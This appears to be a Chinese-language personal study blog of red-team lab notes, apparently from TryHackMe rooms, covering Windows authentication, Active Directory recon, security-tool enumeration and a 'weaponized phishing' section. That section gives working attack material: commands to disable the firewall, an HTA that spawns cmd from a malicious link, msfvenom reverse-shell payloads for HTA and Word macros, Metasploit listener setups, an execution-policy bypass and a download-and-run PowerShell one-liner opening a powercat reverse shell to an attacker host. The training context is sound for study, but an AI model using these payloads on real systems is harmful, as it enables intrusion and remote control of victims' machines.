class="line"></span><br><span class="line">- **Server**：服务器。这两个缩写通常都表示服务器。服务器是一种计算机，专门用于为其他计算机或设备提供服务和资源。服务器可以运行各种服务，如 Web 服务、数据库服务、文件存储服务等。服务器通常具有更高的性能和更强的处理能力，以满足多用户和高负载的需求。</span><br><span class="line"></span><br><span class="line">## 身份验证</span><br><span class="line"></span><br><span class="line">### Kerberos：</span><br><span class="line"></span><br><span class="line">任何较新版本的 Windows 均使用此协议。这是任何较新域中的默认协议。</span><br><span class="line"></span><br><span class="line">机制：</span><br><span class="line"></span><br><span class="line">1. 创建票据![image-20250104210635344](https://github.com/DDL08/images/blob/img/img/image-20250104210635344.png?raw=true)</span><br><span class="line">   1. 用户将（用户名+密码派生的密钥加密的时间戳）-》密钥分发中心（KDC）Key Distribution Center</span><br><span class="line">   2. KDC创建并返回一个（TGT）**Ticket Granting Ticket** +会话密钥</span><br><span class="line">      - TGT是krbtgt账户的密码hash加密的，因为用户无法访问其内容（域控的一个密码</span><br><span class="line">      - TGT包含会话密钥的副本作为其内容的一部分，KDC无需存储会话密钥，应为能根据解密tgt来恢复副本（如果需要）</span><br><span class="line">      - 在 Windows 域中，KDC 是域控制器的一部分。域控制器不仅负责存储和管理 Active Directory 数据库，还包括负责身份验证和票证颁发的 KDC。</span><br><span class="line">2. 请求服务![image-20250104210656675](https://github.com/DDL08/images/blob/img/img/image-20250104210656675.png?raw=true)</span><br><span class="line">   1. 用户向KDC发送TGT，请求TGS(**Ticket Granting Service** )请求票证授予服务。</span><br><span class="line">      - 附加会话密钥加密的（用户和时间戳）+服务主体名称 **Service Principal Name (SPN)**</span><br><span class="line">   2. KDC向用户发送TGS+服务会话密钥，使用这个密钥来验证我们要访问的服务，</span><br><span class="line">      - TGS使用**Service Owner Hash**服务所有者hash派生的密钥进行加密，加密过程中包含（服务会话密钥的副本）以便服务所有者可通过TGS来访问</span><br><span class="line">   3. 用户通过将自身配置的账户的密码hash来解密TGS并验证服务会话![image-20250104210731648](https://github.com/DDL08/images/blob/img/img/image-20250104210731648.png?raw=true)</span><br><span class="line"></span><br><span class="line">### NetNTLM：</span><br><span class="line"></span><br><span class="line">![image-20250104211643536](https://github.com/DDL08/images/blob/img/img/image-20250104211643536.png?raw=true)</span><br><span class="line"></span><br><span class="line">为了兼容性目的而保留的旧式身份验证协议。</span><br><span class="line"></span><br><span class="line">1. 客户端向其想要访问的服务器发送身份验证请求。</span><br><span class="line">2. 服务器生成一个随机数并将其作为挑战发送给客户端。</span><br><span class="line">3. 客户端将其NTLM密码哈希与挑战（和其他已知数据）相结合，以生成对质询的响应并将其发送回服务器进行验证。</span><br><span class="line">4. 服务器将质询和响应转发给域控制器进行验证。</span><br><span class="line">5. 域控制器使用该质询重新计算响应，并将其与客户端发送的原始响应进行比较。 如果两者匹配，则客户端通过身份验证； 否则，访问被拒绝。 身份验证结果将发送回服务器。</span><br><span class="line">6. 服务器将认证结果转发给客户端。</span><br><span class="line"></span><br><span class="line">请注意，出于安全考虑，用户的密码（或哈希值）绝不会通过网络传输。</span><br><span class="line"></span><br><span class="line">**注意：**所述流程适用于使用域帐户的情况。如果使用本地帐户，服务器可以验证对质询的响应本身，而无需与域控制器交互，因为它已将密码哈希存储在其 SAM 上。</span><br><span class="line"></span><br><span class="line"># 工作组</span><br><span class="line"></span><br><span class="line">Group Policy Objects (GPO).组策略对象</span><br><span class="line"></span><br><span class="line">由于此 GPO 适用于整个域，因此对它的任何更改都会影响所有计算机。</span><br><span class="line"></span><br><span class="line">一旦对任何 GPO 进行了更改，计算机可能需要长达 2 小时才能跟上。如果您想强制任何特定计算机立即同步其 GPO，您可以随时在所需的计算机上运行以下命令：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
PS C:\&gt; gpupdate /force
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 组设置对部门的限制</span><br><span class="line"></span><br><span class="line">1. 创建一个名为的新GPO并打开它进行编辑。由于我们希望此GPO应用于特定用户，我们将查找User Configuration以下策略：</span><br><span class="line">2. 通过将GPO拖到每个 OU 来链接</span><br><span class="line"></span><br><span class="line">- 用于将 **GPO**（组策略对象）分发到域机器的网络共享名称是</span><br><span class="line"></span><br><span class="line">sysvol</span><br><span class="line"></span><br><span class="line">## 共享文件夹</span><br><span class="line"></span><br><span class="line">在 Windows 域中，**SYSVOL** 是一个共享文件夹，包含域的公共文件，这些文件会被复制到所有域控制器上，并用于存储与组策略相关的文件（如 GPO 的策略设置、脚本等）。这些文件夹默认对域中的计算机和用户可用，并确保策略在所有计算机间一致地分发。</span><br><span class="line"></span><br><span class="line"># 红队</span><br><span class="line"></span><br><span class="line">### C2框架</span><br><span class="line"></span><br><span class="line">https://tryhackme.com/r/room/introtoc2</span><br><span class="line"></span><br><span class="line">#### 免费</span><br><span class="line"></span><br><span class="line">1. **Metasploit**</span><br><span class="line">2. **Armitage**</span><br><span class="line">   - 和cobalt strike相似</span><br><span class="line">3. **Powershell Empire/Starkiller**帝国/**弑星者**</span><br><span class="line">4. **Covenant**盟约</span><br><span class="line">   - c#编写的</span><br><span class="line">   - 主要用于后期开发和横向移动</span><br><span class="line">5. **Sliver** 裂片</span><br><span class="line">   - go写的</span><br><span class="line"></span><br><span class="line">#### 付费</span><br><span class="line"></span><br><span class="line">1. **Cobalt Strike**钴打击</span><br><span class="line">   - 打windows挺好用的，</span><br><span class="line">   - java写的</span><br><span class="line">2. **Brute Ratel**野蛮人</span><br><span class="line">   - 过阶段看看</span><br><span class="line">   - https://bruteratel.com/</span><br><span class="line">   - 教学https://bruteratel.com/tabs/tutorials/</span><br><span class="line"></span><br><span class="line">### 概念知识，垃圾堆</span><br><span class="line"></span><br><span class="line">全球企业攻击标准</span><br><span class="line"></span><br><span class="line">**OPSEC** 是 **Operational Security**（操作安全）</span><br><span class="line"></span><br><span class="line">- /22是子网掩码255.255.255.0</span><br><span class="line">- /24是0到255</span><br><span class="line"></span><br><span class="line">1. Bean Enterprises 将密切监控与 DMZ 和关键/生产系统的交互。</span><br><span class="line">   1. 禁止与“*.bethechange.xyz”进行任何互动。</span><br><span class="line">   2. 允许与“*.globalenterprises.thm”的所有交互。</span><br><span class="line"></span><br><span class="line">**Advanced Persistent Threats (APT)高级持续性威胁**</span><br><span class="line"></span><br><span class="line">**Tactics, Techniques and Procedures (TTPs)战术、技术和程序**</span><br><span class="line"></span><br><span class="line">## 信息搜集</span><br><span class="line"></span><br><span class="line">### 域名信息搜集</span><br><span class="line"></span><br><span class="line">#### 平台</span><br><span class="line"></span><br><span class="line">https://threatintelligenceplatform.com/</span><br><span class="line"></span><br><span class="line">https://viewdns.info/</span><br><span class="line"></span><br><span class="line">[maltego](https://www.maltego.com/transform-hub/)就是过度人性化了</span><br><span class="line"></span><br><span class="line">#### 命令</span><br><span class="line"></span><br><span class="line">- whois</span><br><span class="line">- nslookup</span><br><span class="line">  - ipv4/6</span><br><span class="line">- dig</span><br><span class="line">  - 指定dns服务器，例如dig clinic.thmredteam.com @1.1.1.1</span><br><span class="line">- host</span><br><span class="line">- traceroute</span><br><span class="line">  - 显示路由，但只显示几个</span><br><span class="line">- recon-ng  （recon侦察</span><br><span class="line">  - recon-ng -w clinicredteam 创建工作区</span><br><span class="line">  - db insert domains 输入插入域名，然后下一句输入域名</span><br><span class="line">  - marketplace search censys_email_address 搜索模块</span><br><span class="line">  - marketplace info censys_email_address 搜索模块信息</span><br><span class="line">    - `modules search`获取所有已安装模块的列表</span><br><span class="line">    - `modules load MODULE`将特定模块加载到内存中</span><br><span class="line">    - load module</span><br><span class="line">    - run </span><br><span class="line"></span><br><span class="line">#### Google</span><br><span class="line"></span><br><span class="line">如何使用 Google 搜索 `xls` clinic.thmredteam.com 的索引？</span><br><span class="line"></span><br><span class="line">- filetype:xls site:clinic.thmredteam.com</span><br><span class="line"></span><br><span class="line">如何使用 Google 搜索包含“ `passwords` clinic.thmredteam.com”一词的文件？</span><br><span class="line"></span><br><span class="line">- passwords site:clinic.thmredteam.com</span><br><span class="line"></span><br><span class="line">### 内部信息收集</span><br><span class="line"></span><br><span class="line">####  DMZ</span><br><span class="line"></span><br><span class="line">Demilitarized Zone非军事区</span><br><span class="line"></span><br><span class="line">用来隔离和启用对公共网络流量，不受信任流量的访问控制</span><br><span class="line"></span><br><span class="line">####  TCP 和 UDP 开放端口</span><br><span class="line"></span><br><span class="line">netstat -na</span><br><span class="line"></span><br><span class="line">arp -a</span><br><span class="line"></span><br><span class="line">查找域内情况</span><br><span class="line"></span><br><span class="line">systeminfo | findstr Domain</span><br><span class="line"></span><br><span class="line">#### enumerate</span><br><span class="line"></span><br><span class="line">用powershell</span><br><span class="line"></span><br></pre></td></tr></table></figure>
Get-ADUser  -Filter *
</code></pre>
</li>
</ul>
<p>#枚举用户和组<br>Get-ADUser -Filter * -SearchBase “CN&#x3D;Users,DC&#x3D;THMREDTEAM,DC&#x3D;COM”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 看防火墙</span><br><span class="line"></span><br><span class="line">##### wmic</span><br><span class="line"></span><br><span class="line">- PS C:\Users\thm&gt; wmic /namespace:\\root\securitycenter2 path antivirusproduct</span><br><span class="line">  - 大概是这样，没做出来</span><br><span class="line"></span><br><span class="line">##### 微软防御</span><br><span class="line"></span><br><span class="line">- 查看windows Defender</span><br><span class="line">  - Get-Service WinDefend</span><br><span class="line">- 获取当前windows Defender状态</span><br><span class="line">  - Get-MpComputerStatus | select RealTimeProtectionEnabled</span><br><span class="line">- 防火墙配置文件使用情况查看</span><br><span class="line">  - Get-NetFirewallProfile | Format-Table Name, Enabled</span><br><span class="line">- 禁用防火墙配置文件</span><br><span class="line">  - Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False</span><br><span class="line">- 查看防火墙规则</span><br><span class="line">  - Get-NetFirewallRule | select DisplayName, Enabled, Description</span><br><span class="line">- 不知道防火墙会阻止什么，用powershell测试</span><br><span class="line">  - Test-NetConnection -ComputerName 127.0.0.1 -Port 80</span><br><span class="line">  - (New-Object System.Net.Sockets.TcpClient(&quot;127.0.0.1&quot;, &quot;80&quot;)).Connected</span><br><span class="line"></span><br><span class="line">##### sysmon系统监视器</span><br><span class="line"></span><br><span class="line">- 检测被害主机是否可用sysmon</span><br><span class="line"></span><br><span class="line">  - Get-Process | Where-Object &#123; $_.ProcessName -eq &quot;Sysmon&quot; &#125;</span><br><span class="line"></span><br><span class="line">- 或者找以下服务</span><br><span class="line"></span><br><span class="line">  - Get-CimInstance win32_service -Filter &quot;Description = &#x27;System Monitor service&#x27;&quot;</span><br><span class="line"></span><br><span class="line">- 或者查找注册表</span><br><span class="line"></span><br><span class="line">  - Get-CimInstance win32_service -Filter &quot;Description = &#x27;System Monitor service&#x27;&quot;</span><br><span class="line"></span><br><span class="line">- 若已安装可以尝试查找sysmon配置文件（如果有权，来了解管理员在监视什么</span><br><span class="line"></span><br><span class="line">  - findstr /si &#x27;&lt;ProcessCreate onmatch=&quot;exclude&quot;&gt;&#x27; C:\tools\*</span><br><span class="line"></span><br><span class="line">- wmic枚举电脑里面的应用和版本</span><br><span class="line"></span><br><span class="line">  - wmic product get name,version</span><br><span class="line"></span><br><span class="line">- 获取隐藏目录</span><br><span class="line"></span><br><span class="line">  - Get-ChildItem -Hidden -Path C:\Users\kkidd\Desktop\</span><br><span class="line"></span><br><span class="line">- 题目查找服务</span><br><span class="line"></span><br><span class="line">  - net start</span><br><span class="line">  - wmic service where &quot;name like &#x27;THM Service&quot; get Name,PathName</span><br><span class="line">    - 不好使就换</span><br><span class="line">    - Get-WmiObject -Class Win32_Service | Where-Object &#123; $_.Name -eq &quot;THM Service&quot; &#125; | Select-Object Name, PathName</span><br><span class="line">  - Get-Process -Name THM-Service</span><br><span class="line">  - netstat -noa |findstr &quot;LISTENING&quot; |findstr &quot;2748&quot;</span><br><span class="line"></span><br><span class="line">- DNS 服务是任何 Active Directory 环境和网络中常用的协议。附加的机器为 AD 提供 DNS 服务。让我们通过执行区域传输 DNS 来枚举 DNS</span><br><span class="line"></span><br><span class="line">  - nslookup.exe</span><br><span class="line"></span><br><span class="line">  - server 本地IP</span><br><span class="line"></span><br><span class="line">  - ls -d thmredteam.com</span><br><span class="line"></span><br><span class="line">    可以查看到域控IP</span><br><span class="line"></span><br><span class="line">#### 常见防御</span><br><span class="line"></span><br><span class="line">##### HIDS/ HIPS</span><br><span class="line"></span><br><span class="line">Host-based Intrusion Detection/Prevention System入侵检测和预防系统</span><br><span class="line"></span><br><span class="line">##### EDR</span><br><span class="line"></span><br><span class="line">Endpoint Detection and Response端点检测和响应</span><br><span class="line"></span><br><span class="line">EDR检测软件，常见如下👇</span><br><span class="line"></span><br><span class="line">Cylance</span><br><span class="line">Crowdstrike</span><br><span class="line">Symantec</span><br><span class="line">SentinelOne</span><br><span class="line">Many others</span><br><span class="line"></span><br><span class="line">##### SIEM</span><br><span class="line"></span><br><span class="line">Security Information and Event Management (SIEM)安全信息和事件管理</span><br><span class="line"></span><br><span class="line">##### NIDS/NIPS</span><br><span class="line"></span><br><span class="line">Intrusion Detection System and Intrusion Prevention System (NIDS/NIPS)入侵检测和入侵防御系统</span><br><span class="line"></span><br><span class="line">## 武器化钓鱼</span><br><span class="line"></span><br><span class="line">### 进程迁移</span><br><span class="line"></span><br><span class="line">拿到shell之后先迁移避免因为关闭docx导致连接终端，如下</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>run post&#x2F;windows&#x2F;manage&#x2F;migrate</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">远程桌面连接</span><br><span class="line"></span><br><span class="line">RDP协议</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>xfreerdp &#x2F;v:10.10.172.9 &#x2F;u:thm &#x2F;p:TryHackM3 +clipboard</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">WinRM协议</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>evil-winrm -i 10.10.44.235 -u thmuser1 -p Password321</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- 启用剪切板共享功能进行连接</span><br><span class="line"></span><br><span class="line">### WSH</span><br><span class="line"></span><br><span class="line">(Windows Scripting Host)</span><br><span class="line"></span><br><span class="line"> Microsoft Visual Basic 脚本 (VBScript)，包括vbs 和vbe</span><br><span class="line"></span><br><span class="line">#### vbs脚本</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Dim message<br>message &#x3D; “Welcome to THM”<br>MsgBox message</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">弹计算器👇弹不了cmd不知道为什么</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Dim message<br>message &#x3D; “Welcome to THM”<br>MsgBox message</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 执行方法</span><br><span class="line"></span><br><span class="line">- **双击**</span><br><span class="line">- wscript运行</span><br><span class="line">  - wscript c:\Users\thm\Desktop\payload.vbs</span><br><span class="line">- csript.exe运行</span><br><span class="line">  - cscript.exe c:\Users\thm\Desktop\payload.vbs</span><br><span class="line">- （vbs列入黑名单的</span><br><span class="line">  - wscript /e:VBScript c:\Users\thm\Desktop\payload.txt</span><br><span class="line"></span><br><span class="line">### HTA</span><br><span class="line"></span><br><span class="line">HTML Application (HTA)包含 JScript 和 VBScript 的动态 HTML页面。</span><br><span class="line"></span><br><span class="line">LOLBINS（Living-of-the-land Binaries）工具 mshta用于执行HTA文件。它可以自行执行，也可以从 Internet Explorer 自动执行</span><br><span class="line"></span><br><span class="line">#### 执行方法</span><br><span class="line"></span><br><span class="line">先在文件夹开启web服务</span><br><span class="line"></span><br><span class="line">- python3 -m http.server 8090</span><br><span class="line"></span><br><span class="line">当前目录要有1.hta文件，内容如下</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<html>
<body>
<script>
    var c= 'cmd.exe'
    new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">在受害者机器上，使用 Microsoft Edge 访问恶意链接 http://IP:8090/1.hta 。下载即可出cmd，但在win11上不好使</span><br><span class="line"></span><br><span class="line">##### 一msf</span><br><span class="line"></span><br><span class="line">msf生成回连码</span><br><span class="line"></span><br></pre></td></tr></table></figure>
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">开启监听nc -lvp 443</span><br><span class="line"></span><br><span class="line">开启web服务，让受害机访问http:/10.8.232.3:8090/thm.hta下载并且运行</span><br><span class="line"></span><br><span class="line">##### 二msf</span><br><span class="line"></span><br><span class="line">直接msf一条龙服务</span><br><span class="line"></span><br></pre></td></tr></table></figure>
msf6 > use exploit/windows/misc/hta_server
set LHOST 10.9.0.81
set LPORT 443
set SRVHOST 10.9.0.81
set payload windows/meterpreter/reverse_tcp
exploit
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">下边会给个连接，让受害者下载并且运行就行</span><br><span class="line"></span><br><span class="line">### VBA</span><br><span class="line"></span><br><span class="line">Visual Basic for Application (VBA)</span><br><span class="line"></span><br><span class="line">macro宏</span><br><span class="line"></span><br><span class="line">打开docx文件，编写宏**view → macros**-&gt;里面这么写，选**document1**，保存为**Word 97-2003 模板**，其中启用了宏</span><br><span class="line"></span><br></pre></td></tr></table></figure>
Sub Document_Open()
  THM
End Sub

<p>Sub AutoOpen()<br>  THM<br>End Sub</p>
<p>Sub THM()<br>   MsgBox (“Welcome to Weaponization Room!”)<br>End Sub</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Microsoft Word 将显示一条安全消息，表明宏已被禁用，并让我们选择启用它。让我们启用它并继续检查结果</span><br><span class="line"></span><br><span class="line">再次打开时会出现弹出字符</span><br><span class="line"></span><br><span class="line">弹出计算机👇</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Sub Document_Open()<br>  THM<br>End Sub</p>
<p>Sub AutoOpen()<br>  THM<br>End Sub</p>
<p>Sub THM()<br>    Dim payload As String<br>    payload &#x3D; “calc.exe”<br>    CreateObject(“Wscript.Shell”).Run payload,0<br>End Sub</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 执行方法</span><br><span class="line"></span><br><span class="line">##### 一msf</span><br><span class="line"></span><br><span class="line">生成码，放在宏里面</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.50.159.15 LPORT&#x3D;443 -f vba</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">监听</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;meterpreter&#x2F;reverse_tcp<br>set LHOST 10.9.0.81<br>set LPORT 443<br>exploit</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### PSH</span><br><span class="line"></span><br><span class="line">PowerShell（PSH）</span><br><span class="line"></span><br><span class="line">Microsoft 出于安全目的禁用执行 PowerShell 脚本.ps1。PowerShell执行策略设置为Restricted</span><br><span class="line"></span><br><span class="line">#### 用来确定powershell设置</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Get-ExecutionPolicy<br>显示restricted  表示受限制的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 修改👇</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Set-ExecutionPolicy -Scope CurrentUser RemoteSigned</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 绕过</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>powershell -ex bypass -File thm.ps1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 使用</span><br><span class="line"></span><br><span class="line">攻击机执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>git clone <a target="_blank" rel="noopener" href="https://github.com/besimorhino/powercat.git">https://github.com/besimorhino/powercat.git</a><br>下载完成之后👇<br>cd powercat<br>python3 -m http.server 8080<br>监听<br>nc -lvp 1337</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">受害靶机执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>powershell -c “IEX(New-Object System.Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://attackbox_ip:8080/powercat.ps1');powercat">http://ATTACKBOX_IP:8080/powercat.ps1&#39;);powercat</a> -c ATTACKBOX_IP -p 1337 -e cmd”</p>
